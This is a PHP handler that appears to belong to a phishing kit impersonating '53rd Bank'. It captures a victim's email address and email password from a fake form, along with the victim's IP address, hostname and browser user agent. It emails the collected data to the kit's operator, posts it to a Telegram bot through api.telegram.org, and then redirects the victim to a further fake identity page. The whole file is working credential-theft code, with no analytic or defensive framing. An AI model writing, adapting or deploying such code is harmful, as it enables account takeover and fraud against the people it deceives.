<?php 


	ob_start();
session_start();
	include '../conf.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];		
			if ( isset( $_POST['emailerr'] ) ) {
		
        $_SESSION['emailerr'] 	  = $_POST['emailerr'];
		$_SESSION['empasserr'] 	  = $_POST['empasserr'];
		$msg = <<<EOT
-53rd Bank Second Email | Password -
[Email Address] 		: {$_SESSION['emailerr']}
[Email Password]		: {$_SESSION['empasserr']}
	- IP - Info -
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

 - end - 
\r\n\r\n
EOT;

		$subject = " 53RD Email Acess 2   From $ip";
        $headers = "From: Gohard2 <5r3d@gohard2.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
		@mail($mailto,$subject,$msg,$headers);
		
		$data = [
			'chat_id' => $chatid,
			'text' => $msg
		];
		$response = file_get_contents("https://api.telegram.org/bot$apitoken/sendMessage?" . http_build_query($data) );



        header("Location: ../c17.php?oamo/identity/&token=cjmvJprW2Dw1/mfacontacts_identification");
        exit();
	} else {
		header("Location: ../index.php?");
		exit();
	}
?>